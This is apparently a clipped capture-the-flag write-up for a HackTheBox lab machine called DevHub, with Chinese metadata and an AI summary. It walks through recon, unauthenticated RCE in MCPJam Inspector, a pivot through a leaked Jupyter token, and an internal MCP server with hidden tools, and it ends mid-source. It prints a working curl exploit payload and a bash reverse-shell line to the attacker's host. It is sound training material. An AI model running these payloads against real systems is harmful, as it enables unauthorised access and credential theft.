---
title: "HTB: DevHub | 0xdf hacks stuff"
source: https://0xdf.gitlab.io/2026/10/10/htb-devhub.html
source_host: 0xdf.gitlab.io
clip_date: 2026-10-10T22:20:29+08:00
trace_id: 7f8fff10-c4e5-4a88-acef-1a63dc743b29
content_hash: 3c46e52f2eee0df3dc155e26f43ad0a3dceca0c8b15c71547fa100a689e4bea6
status: synced
tags:
  - 协议分析
  - 漏洞分析
series: null
feed_source: 0xdf·HTB/逆向
ai_summary: DevHub 靶机围绕 AI 代理使用的 MCP 协议服务展开，从未授权 RCE 到本地 Jupyter 越权，最终通过内部 MCP 服务泄露 root 私钥。
ai_summary_style: key-points
images_status:
  total: 17
  succeeded: 14
  failed_urls:
    - https://www.hackthebox.com/badge/image/480556
    - https://www.hackthebox.com/badge/image/1893875
    - https://www.hackthebox.com/badge/image/1949055
notion_page_id: 3f575244-d011-814f-a522-d3d8b53e968f
ioc:
  cves:
    - CVE-2026-23744
  cwes: []
  hashes:
    - a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> DevHub 靶机围绕 AI 代理使用的 MCP 协议服务展开，从未授权 RCE 到本地 Jupyter 越权，最终通过内部 MCP 服务泄露 root 私钥。
> 
> - **初始暴露面：** nmap 发现 22/SSH、80/nginx 与 6274/MCPJam Inspector；80 端口重定向至 `devhub.htb`，页面自称 Ubuntu 24.04 但实际指纹为 22.04，并提示内网有 Jupyter（8888）与 Git 服务。
> - **RCE 入口：** MCPJam v1.4.2 存在 CVE-2026-23744（CVSS 9.8），默认监听 0.0.0.0；向 `/api/mcp/connect` POST `serverConfig.command` 与 `args` 即可无认证执行命令，用 bash 反弹获得 `mcp-dev` shell。
> - **横向到 analyst：** `/etc/systemd/system/jupyter.service` 与 `ps auxww` 中均暴露 Jupyter token `a7f3b2c9...`；SSH 本地端口转发 8888 后进入 Jupyter 终端，即获 analyst shell 与 `user.txt`。
> - **内网 MCP 提权：** analyst 家目录 `.opsmcp_key` 含 API Key，`/opt/opsmcp/server.py`（root 运行、监听 127.0.0.1:5000）定义了两个隐藏工具：`ops._admin_dump` 与 `ops._debug_mode`。
> - **读取 root 私钥：** 调用 `/tools/call` 传入 `{"name":"ops._admin_dump","arguments":{"target":"ssh_keys","confirm":"true"}}`（confirm 只需真值即可），直接返回 root 的 `id_rsa`，保存后 SSH 登录取得 root.txt。

[HTB: DevHub](https://0xdf.gitlab.io/2026/10/10/htb-devhub.html)

![](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/devhub-cover.webp)

DevHub is a box built around MCP servers, the protocol that AI agents use to reach tools. I’ll find an MCPJam inspector listening on all interfaces and abuse an unauthenticated endpoint that spawns a process from an attacker-supplied command, getting remote code execution and a shell. From there I’ll find a Jupyter Lab instance bound to localhost with its access token sitting in both the systemd service file and the process list, and tunnel in to pivot to the next user. That user holds the API key for an internal MCP server running as root, which offers an undocumented tool that dumps root’s private SSH key.

## Box Info

[![DevHub](https://0xdf.gitlab.io/icons/box-devhub.webp)](https://hackthebox.com/machines/devhub)

[DevHub](https://hackthebox.com/machines/devhub)

Medium

Retire Date 10 Oct 2026

![Linux](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/85d7b9cda22fbe98.png)

OS ![Linux](https://0xdf.gitlab.io/icons/Linux.webp)

Rated Difficulty ![Rated difficulty for DevHub](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/devhub-diff.webp)

![Rated difficulty for DevHub](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/2833c3a7e2ec6ac0.png)

Radar Graph ![Radar chart for DevHub](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/devhub-radar.webp)

![Radar chart for DevHub](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/0c2bcf6c85fa65f9.png)

User

00:06:21 [xtk](https://app.hackthebox.com/users/480556)

![⚠️ 图片托管失败 · xtk](https://www.hackthebox.com/badge/image/480556)

Root

00:08:20 [ahos6](https://app.hackthebox.com/users/1893875)

![⚠️ 图片托管失败 · ahos6](https://www.hackthebox.com/badge/image/1893875)

Creator [Neetrox](https://app.hackthebox.com/users/1949055)

![⚠️ 图片托管失败 · Neetrox](https://www.hackthebox.com/badge/image/1949055)

## Recon

### Initial Scanning

`nmap` finds three open TCP ports, SSH (22) and two HTTP (80, 6274):

```swift
oxdf@hacky$ sudo nmap -p- --reason --min-rate 10000 10.129.245.216
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-09-25 13:29 UTC
Nmap scan report for 10.129.245.216
Host is up, received echo-reply ttl 63 (0.027s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
80/tcp   open  http    syn-ack ttl 63
6274/tcp open  unknown syn-ack ttl 63

Nmap done: 1 IP address (1 host up) scanned in 13.37 seconds
oxdf@hacky$ sudo nmap -p 22,80,6274 -sCV 10.129.245.216
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-09-25 13:30 UTC
Nmap scan report for 10.129.245.216
Host is up (0.020s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 35:78:2e:79:0d:87:13:05:2f:53:8e:e7:3c:55:b6:4c (ECDSA)
|_  256 dd:56:8e:bc:da:b8:38:3e:9a:cd:0b:74:ee:53:85:f8 (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devhub.htb/
6274/tcp open  unknown
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq:
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   GetRequest:
|     HTTP/1.1 200 OK
|     access-control-allow-credentials: true
|     content-length: 466
|     content-type: text/html; charset=utf-8
|     vary: Origin
|     Date: Fri, 25 Sep 2026 13:30:47 GMT
|     Connection: close
|     <!doctype html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8" />
|     <link rel="icon" type="image/svg+xml" href="/mcp_jam.svg" />
|     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
|     <title>MCPJam Inspector</title>
|     <script type="module" crossorigin src="/assets/index-DRYhT9Xb.js"></script>
|     <link rel="stylesheet" crossorigin href="/assets/index-XvFRNbCs.css">
|     </head>
|     <body>
|     <div id="root"></div>
|     </body>
|     </html>
|   HTTPOptions, RTSPRequest:
|     HTTP/1.1 204 No Content
|     access-control-allow-credentials: true
|     access-control-allow-methods: GET,HEAD,PUT,POST,DELETE,PATCH
|     vary: Origin
|     content-type: text/plain; charset=UTF-8
|     Date: Fri, 25 Sep 2026 13:30:47 GMT
|_    Connection: close
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port6274-TCP:V=7.94SVN%I=7%D=9/25%Time=6AB67786%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,290,"HTTP/1\.1\x20200\x20OK\r\naccess-control-allow-credent
SF:ials:\x20true\r\ncontent-length:\x20466\r\ncontent-type:\x20text/html;\
SF:x20charset=utf-8\r\nvary:\x20Origin\r\nDate:\x20Fri,\x2025\x20Sep\x2020
SF:26\x2013:30:47\x20GMT\r\nConnection:\x20close\r\n\r\n<!doctype\x20html>
SF:\n<html\x20lang=\"en\">\n\x20\x20<head>\n\x20\x20\x20\x20<meta\x20chars
SF:et=\"UTF-8\"\x20/>\n\x20\x20\x20\x20<link\x20rel=\"icon\"\x20type=\"ima
SF:ge/svg\+xml\"\x20href=\"/mcp_jam\.svg\"\x20/>\n\x20\x20\x20\x20<meta\x2
SF:0name=\"viewport\"\x20content=\"width=device-width,\x20initial-scale=1\
SF:.0\"\x20/>\n\x20\x20\x20\x20<title>MCPJam\x20Inspector</title>\n\x20\x2
SF:0\x20\x20<script\x20type=\"module\"\x20crossorigin\x20src=\"/assets/ind
SF:ex-DRYhT9Xb\.js\"></script>\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\
SF:"\x20crossorigin\x20href=\"/assets/index-XvFRNbCs\.css\">\n\x20\x20</he
SF:ad>\n\x20\x20<body>\n\x20\x20\x20\x20<div\x20id=\"root\"></div>\n\x20\x
SF:20</body>\n</html>\n")%r(HTTPOptions,F0,"HTTP/1\.1\x20204\x20No\x20Cont
SF:ent\r\naccess-control-allow-credentials:\x20true\r\naccess-control-allo
SF:w-methods:\x20GET,HEAD,PUT,POST,DELETE,PATCH\r\nvary:\x20Origin\r\ncont
SF:ent-type:\x20text/plain;\x20charset=UTF-8\r\nDate:\x20Fri,\x2025\x20Sep
SF:\x202026\x2013:30:47\x20GMT\r\nConnection:\x20close\r\n\r\n")%r(RTSPReq
SF:uest,F0,"HTTP/1\.1\x20204\x20No\x20Content\r\naccess-control-allow-cred
SF:entials:\x20true\r\naccess-control-allow-methods:\x20GET,HEAD,PUT,POST,
SF:DELETE,PATCH\r\nvary:\x20Origin\r\ncontent-type:\x20text/plain;\x20char
SF:set=UTF-8\r\nDate:\x20Fri,\x2025\x20Sep\x202026\x2013:30:47\x20GMT\r\nC
SF:onnection:\x20close\r\n\r\n")%r(RPCCheck,2F,"HTTP/1\.1\x20400\x20Bad\x2
SF:0Request\r\nConnection:\x20close\r\n\r\n")%r(DNSVersionBindReqTCP,2F,"H
SF:TTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(D
SF:NSStatusRequestTCP,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection
SF::\x20close\r\n\r\n")%r(Help,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nC
SF:onnection:\x20close\r\n\r\n")%r(SSLSessionReq,2F,"HTTP/1\.1\x20400\x20B
SF:ad\x20Request\r\nConnection:\x20close\r\n\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.82 seconds
```

![expand](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/d003c6ff7b8f3bed.png)

Based on the [OpenSSH and Nginx](https://0xdf.gitlab.io/cheatsheets/os#ubuntu) versions, the host is likely running Ubuntu 22.04 Jammy.

All of the ports show a TTL of 63, which matches the [expected TTL](https://0xdf.gitlab.io/cheatsheets/os#os-identification) for Linux one hop away.

There’s a redirect to `devhub.htb` on port 80. I’ll use `ffuf` to bruteforce for subdomains that respond differently, but not find any. I’ll update my `hosts` file:

```
10.129.245.216 devhub.htb
```

I’ll rescan port 80 with the hostname, but not find anything interesting.

The HTTP responses on 6274 reference MCPJam.

### devhub.htb - TCP 80

#### Site

The site is a very simple webpage claiming to be the DevHub team internal portal. It shows three different services as well as some technologies:

![image-20260925103828189](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/29ae81ed2ab57f13.png)

![image-20260925103828189](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260925103828189.webp)

MCP Inspector lines up with the activity I noted above on 6274. I’ll note there’s an internal Jupyter-based service on 8888, and potentially a Git server somewhere.

It’s interesting that it mentions Ubuntu 24.04, as I fingerprinted the host as 22.04.

#### Tech Stack

The HTTP response headers show just Nginx:

```yaml
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Fri, 25 Sep 2026 22:37:27 GMT
Content-Type: text/html
Last-Modified: Thu, 22 Jan 2026 14:56:30 GMT
Connection: keep-alive
ETag: W/"69723a9e-d44"
Content-Length: 3396
```

The main page loads as `/index.html`, suggesting a static page.

The 404 page matches the default [Nginx 404](https://0xdf.gitlab.io/cheatsheets/404#nginx):

![image-20260925104112694](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260925104112694.webp)

#### Directory Brute Force

I’ll run `feroxbuster` against the site, and include `-x html` since I’ve seen that in use:

```sql
oxdf@hacky$ feroxbuster -u http://devhub.htb -x html

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://devhub.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 🔎  Extract Links         │ true
 💲  Extensions            │ [html]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        7l       12w      162c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       67l      323w     3396c http://devhub.htb/
200      GET       67l      323w     3396c http://devhub.htb/index.html
[####################] - 26s    30000/30000   0s      found:2       errors:0      
[####################] - 25s    30000/30000   1188/s  http://devhub.htb/
```

Nothing interesting at all.

### MCPJam - TCP 6274

#### Site

Port 6274 hosts an instance of [MCPJam](https://www.mcpjam.com/):

![image-20260925110010699](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/6f3acde0a22ea314.png)

![image-20260925110010699](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260925110010699.webp)

This looks just like [HTB: Kobold](https://0xdf.gitlab.io/2026/08/01/htb-kobold.html#mcpkoboldhtb---tcp-443). [MCPJam](https://www.mcpjam.com/) describes itself as:

> From your first prompt to a continuous gate on every release, MCPJam shows what breaks across every AI client — and how to fix it.

#### Tech Stack

The HTTP response headers don’t show much:

```yaml
HTTP/1.1 200 OK
access-control-allow-credentials: true
content-length: 466
content-type: text/html; charset=utf-8
vary: Origin
Date: Fri, 25 Sep 2026 22:58:49 GMT
Connection: keep-alive
Keep-Alive: timeout=5
```

[MCPJam’s GitHub](https://github.com/MCPJam/inspector) shows it’s written in TypeScript.

There is no 404 page, but rather it just shows the main dashboard.

In Settings, it shows version v1.4.2:

![image-20260925110226414](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/5c983dda669063c2.png)

![image-20260925110226414](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260925110226414.webp)

I’ll skip the directory brute force here.

## Shell as mcp-dev

### CVE-2026-23744

Searching for “mcpjam 1.4.2 cve” returns a bunch of references to CVE-2026-23744:

![image-20260925110442403](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/6b51c545da399975.png)

![image-20260925110442403](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260925110442403.webp)

NIST describes [CVE-2026-23744](https://nvd.nist.gov/vuln/detail/CVE-2026-23744) as:

> MCPJam inspector is the local-first development platform for MCP servers. Versions 1.4.2 and earlier are vulnerable to remote code execution (RCE) vulnerability, which allows an attacker to send a crafted HTTP request that triggers the installation of an MCP server, leading to RCE. Since MCPJam inspector by default listens on 0.0.0.0 instead of 127.0.0.1, an attacker can trigger the RCE remotely via a simple HTTP request. Version 1.4.3 contains a patch.

This vulnerability scored 9.8 on CVSS. MCPJam is a local development tool, but it binds to 0.0.0.0 by default rather than localhost, so the API is reachable from off the host. The connect endpoint takes a command and arguments to launch a local MCP server and runs them without any validation, so any command will do.

[This GitHub advisory](https://github.com/MCPJam/inspector/security/advisories/GHSA-232v-j27c-5pp6) has a lot of good detail, including POC payloads.

### RCE

#### POC

I’ll follow the exact same steps as I did with [HTB: Kobold](https://0xdf.gitlab.io/2026/08/01/htb-kobold.html#rce). To exploit this, I need to send the following payload to `/api/mcp/connect`:

```json
{
    "serverConfig": {
        "command": "<command>",
        "args": [<args>],
        "env": {}
    },
    "serverId": "0xdf"
}
```

I’ll start `tcpdump` listening on my host, and send that with `curl`, with a command to `ping` my VM one time:

```ruby
oxdf@hacky$ curl -k http://devhub.htb:6274/api/mcp/connect -H "Content-Type: application/json" --data '{"serverConfig": {"command": "ping", "args": ["-c", "1", "10.10.15.169"], "env": {}}, "serverId": "0xdf"}'
{"success":false,"error":"Connection failed for server 0xdf: MCP error -32000: Connection closed","details":"MCP error -32000: Connection closed"}
```

It fails, but I get an ICMP packet at `tcpdump`:

```bash
oxdf@hacky$ sudo tcpdump -ni tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
15:20:31.776533 IP 10.129.245.216 > 10.10.15.169: ICMP echo request, id 1, seq 1, length 64
15:20:31.776557 IP 10.10.15.169 > 10.129.245.216: ICMP echo reply, id 1, seq 1, length 64
```

#### Shell

I’ll update the payload replacing the `command` with `bash`, and then the `args` with a `-c` string to run a [bash reverse shell](https://www.youtube.com/watch?v=OjkVep2EIlw). I’ll start `nc` listening, and send:

```
oxdf@hacky$ curl -k http://devhub.htb:6274/api/mcp/connect -H "Content-Type: application/json" --data '{"serverConfig": {"command": "bash", "args": ["-c", "bash -i >& /dev/tcp/10.10.15.169/443 0>&1"], "env": {}}, "serverId": "0xdf"}'
```

This just hangs, but at `nc`:

```ruby
oxdf@hacky$ sudo nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.129.245.216 40538
bash: cannot set terminal process group (1090): Inappropriate ioctl for device
bash: no job control in this shell
mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$
```

I’ll upgrade my shell using the [standard trick](https://www.youtube.com/watch?v=DqE6DxqJg8Q):

```ruby
mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$ script /dev/null -c bash
Script started, output log file is '/dev/null'.
mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$ ^Z
[1]+  Stopped                 sudo nc -lnvp 443
oxdf@hacky$ stty raw -echo; fg
sudo nc -lnvp 443
                 reset
reset: unknown terminal type unknown
Terminal type? screen
mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$ 
```

I can also just drop an SSH key and get solid shell access:

```ruby
mcp-dev@devhub:~$ mkdir .ssh
mcp-dev@devhub:~$ echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing" > .ssh/authorized_keys
mcp-dev@devhub:~$ chmod 700 .ssh/
mcp-dev@devhub:~$ chmod 600 .ssh/authorized_keys 
```

Then I can connect:

```ruby
oxdf@hacky$ ssh -i ~/keys/ed25519_gen mcp-dev@devhub.htb
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-179-generic x86_64)
...[snip]...
mcp-dev@devhub:~$ 
```

It is Ubuntu 22.04, not 24.04 as the site said.

## Shell as analyst

### Enumeration

#### Users

The MCPJam application is being run by a standard user with a home directory in `/home`:

```ruby
mcp-dev@devhub:/opt/mcpjam/node_modules$ cd ~
mcp-dev@devhub:~$ ls -la
total 28
drwxr-x--- 4 mcp-dev mcp-dev 4096 May 27 12:22 .
drwxr-xr-x 4 root    root    4096 Mar 16  2026 ..
-rw------- 1 mcp-dev mcp-dev    0 May 27 12:22 .bash_history
-rw-r--r-- 1 mcp-dev mcp-dev  220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 mcp-dev mcp-dev 3771 Jan  6  2022 .bashrc
drwx------ 2 mcp-dev mcp-dev 4096 May 26 08:42 .cache
lrwxrwxrwx 1 root    root       9 Jan 23  2026 .lesshst -> /dev/null
lrwxrwxrwx 1 root    root       9 Jan 23  2026 .node_repl_history -> /dev/null
drwxrwxr-x 4 mcp-dev mcp-dev 4096 Jan 22  2026 .npm
-rw-r--r-- 1 mcp-dev mcp-dev  807 Jan  6  2022 .profile
lrwxrwxrwx 1 root    root       9 Jan 23  2026 .python_history -> /dev/null
lrwxrwxrwx 1 root    root       9 Jan 23  2026 .viminfo -> /dev/null
```

Nothing too interesting. They can’t run `sudo` (at least without a password):

```
mcp-dev@devhub:~$ sudo -l
[sudo] password for mcp-dev:
```

There’s one other user with a home directory in `/home`:

```
mcp-dev@devhub:/home$ ls
analyst  mcp-dev
```

This all matches the users with shells configured in `passwd`:

```bash
mcp-dev@devhub:/$ cat /etc/passwd | grep 'sh$'
root:x:0:0:root:/root:/bin/bash
mcp-dev:x:1001:1001::/home/mcp-dev:/bin/bash
analyst:x:1002:1002::/home/analyst:/bin/bash
```

#### Filesystem

The root of the filesystem looks pretty standard:

```
mcp-dev@devhub:/$ ls
bin   cdrom  etc   lib    lib64   lost+found  mnt  proc  run   snap  sys  usr
boot  dev    home  lib32  libx32  media       opt  root  sbin  srv   tmp  var
```

`/opt` has a couple items:

```
mcp-dev@devhub:/$ ls opt/
mcpjam  opsmcp
```

`mcpjam` is the install of the application I already exploited. `opsmcp` is a single `server.py` file, and only analyst can read it:

```
mcp-dev@devhub:/$ ls -l opt/opsmcp/
total 8
-rw-r----- 1 analyst analyst 6021 Mar 16  2026 server.py
```

#### Identify Jupyter

The initial website mentioned that Jupyter was listening on `localhost:8888`. There is a service listening on 8888:

```ruby
mcp-dev@devhub:/$ netstat -tnlp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:5000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8888          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:6274            0.0.0.0:*               LISTEN      1291/node           
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -
```

`/etc/systemd/system/jupyter.service` is a service file that runs Jupyter as a service:

```
[Unit]
Description=Jupyter Notebook Server
After=network.target

[Service]
Type=simple
User=analyst
WorkingDirectory=/home/analyst
Environment=PATH=/home/analyst/jupyter-env/bin:/usr/local/bin:/usr/bin:/bin
Environment=JUPYTER_TOKEN=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7
ExecStart=/home/analyst/jupyter-env/bin/jupyter lab --ip=127.0.0.1 --port=8888 --no-browser --notebook-dir=/home/analyst/notebooks --ServerApp.token='a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7' --ServerApp.password='' --ServerApp.allow_origin='' --ServerApp.disable_check_xsrf=False
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
```

It runs as analyst, from their home directory, and sets the IP and port to localhost and 8888. There’s also a token and an empty password.

There are two processes running referencing Jupyter:

```swift
mcp-dev@devhub:/$ ps auxww | grep -i jupyter
analyst     1088  0.0  2.4 182528 96604 ?        Ss   13:13   0:06 /home/analyst/jupyter-env/bin/python3 /home/analyst/jupyter-env/bin/jupyter-lab --ip=127.0.0.1 --port=8888 --no-browser --notebook-dir=/home/analyst/notebooks --ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7 --ServerApp.password= --ServerApp.allow_origin= --ServerApp.disable_check_xsrf=False
root        1094  0.0  0.7  37376 28636 ?        Ss   13:13   0:06 /home/analyst/jupyter-env/bin/python3 /opt/opsmcp/server.py
```

The first is the service. The second is the `server.py` from `/opt/opsmcp`, running as root.

#### Jupyter Access

I’ll reconnect my SSH with `-L 8888:localhost:8888`, and then load `localhost:8888` in my browser:

 ![image-20260925145430486](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260925145430486.webp)![expand](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/d003c6ff7b8f3bed.png)

The token from the process list and service file works to get access:

![image-20260925145517986](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/325c5facac5a0f9b.png)

![image-20260925145517986](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260925145517986.webp)

### SSH

There are a lot of different ways to run code within Jupyter. I’ll go for “Terminal” under “Other”, and it gives a shell as analyst:

![image-20260925145646054](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/f2a87437b0394b26.png)

![image-20260925145646054](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260925145646054.webp)

There’s `user.txt`:

![image-20260925145705340](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/1d6e142fe0c63f2a.png)

![image-20260925145705340](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260925145705340.webp)

I’ll write an SSH key to get more solid access:

![image-20260925145759429](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/ee89afb11ed92ace.png)

![image-20260925145759429](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260925145759429.webp)

And connect over SSH:

```
oxdf@hacky$ ssh -i ~/keys/ed25519_gen analyst@devhub.htb
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-179-generic x86_64)
...[snip]...
analyst@devhub:~$
```

And grab `user.txt`:

```
analyst@devhub:~$ cat user.txt
79eb4984************************
```

## Shell as root

### Enumeration

Looking at analyst’s home directory, the most interesting file is `.opsmcp_key`:

```yaml
analyst@devhub:~$ ls -la
total 60
drwxr-x--- 10 analyst analyst 4096 Sep 25 18:57 .
drwxr-xr-x  4 root    root    4096 Mar 16  2026 ..
-rw-------  1 analyst analyst    0 May 27 12:22 .bash_history
-rw-r--r--  1 analyst analyst  220 Jan  6  2022 .bash_logout
-rw-r--r--  1 analyst analyst 3771 Jan  6  2022 .bashrc
drwx------  2 analyst analyst 4096 Jan 22  2026 .cache
drwxr-xr-x  3 analyst analyst 4096 May 26 08:42 .ipython
drwxr-xr-x  3 analyst analyst 4096 Sep 25 18:54 .jupyter
drwxr-xr-x  7 analyst analyst 4096 Jan 22  2026 jupyter-env
lrwxrwxrwx  1 root    root       9 Jan 23  2026 .lesshst -> /dev/null
drwxr-xr-x  3 analyst analyst 4096 Jan 22  2026 .local
lrwxrwxrwx  1 root    root       9 Jan 23  2026 .node_repl_history -> /dev/null
drwxr-xr-x  3 analyst analyst 4096 May 26 08:42 notebooks
drwxr-xr-x  3 analyst analyst 4096 Jan 22  2026 .npm
-rw-------  1 analyst analyst   35 Mar 16  2026 .opsmcp_key
-rw-r--r--  1 analyst analyst  807 Jan  6  2022 .profile
lrwxrwxrwx  1 root    root       9 Jan 23  2026 .python_history -> /dev/null
drwx------  2 analyst analyst 4096 Sep 25 18:57 .ssh
-rw-r-----  1 root    analyst   33 Sep 25 13:14 user.txt
lrwxrwxrwx  1 root    root       9 Jan 23  2026 .viminfo -> /dev/null
analyst@devhub:~$ cat .opsmcp_key 
opsmcp_secret_key_4f5a6b7c8d9e0f1a
```

`/opt/opsmcp/server.py` is a Python Flask application that is meant to simulate a REST-based MCP server, similar to [LiteLLM’s REST API](https://docs.litellm.ai/docs/mcp_rest_api):

![image-20260925153848530](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/d5c036ce5f8780f3.png)

![image-20260925153848530](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260925153848530.webp)

The endpoints on this one are slightly different. MCP is a way for AI agents to talk to tools and other interfaces, [created by Anthropic](https://www.anthropic.com/news/model-context-protocol) in 2024.

The source takes the following structure:

```python
#!/usr/bin/env python3
"""
OPSMCP - Operations MCP Server
Internal tool for system operations management
"""

from flask import Flask, jsonify, request
import os

app = Flask(__name__)

# API Key for authentication
VALID_API_KEY = "opsmcp_secret_key_4f5a6b7c8d9e0f1a"

...[snip]...

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5000, debug=False)
```

At the top, it defines a list of tools:

```python
# Registered tools (visible)
VISIBLE_TOOLS = {
    "ops.system_status": {
        "description": "Get system status and health metrics",
        "parameters": {}
    },
    "ops.list_services": {
        "description": "List running services",
        "parameters": {}
    },
    "ops.check_disk": {
        "description": "Check disk usage",
        "parameters": {}
    },
    "ops.view_logs": {
        "description": "View recent system logs",
        "parameters": {"service": "string"}
    }
}

# Hidden tools (not in /tools/list but callable)
HIDDEN_TOOLS = {
    "ops._admin_dump": {
        "description": "Emergency credential dump - INTERNAL ONLY",
        "parameters": {"target": "string", "confirm": "boolean"}
    },
    "ops._debug_mode": {
        "description": "Enable debug mode",
        "parameters": {}
    }
}

ALL_TOOLS = {**VISIBLE_TOOLS, **HIDDEN_TOOLS}
```

The two hidden tools look particularly interesting.

There is a helper `check_auth` function that validates the API key is passed in the `X-API-Key` header:

```python
def check_auth():
    """Check API key authentication"""
    api_key = request.headers.get('X-API-Key', '')
    return api_key == VALID_API_KEY
```

Then it defines four routes:

```python
@app.route('/')
def index():
    return jsonify({
        "server": "OPSMCP",
        "version": "2.1.0",
        "status": "operational",
        "endpoints": ["/tools/list", "/tools/call", "/health"],
        "auth": "Required - X-API-Key header"
    })

@app.route('/health')
def health():
    return jsonify({"status": "healthy", "uptime": "14d 3h 22m"})

@app.route('/tools/list')
def list_tools():
    if not check_auth():
        return jsonify({"error": "Unauthorized", "message": "Valid X-API-Key header required"}), 401

    return jsonify({
        "tools": list(VISIBLE_TOOLS.keys()),
        "count": len(VISIBLE_TOOLS),
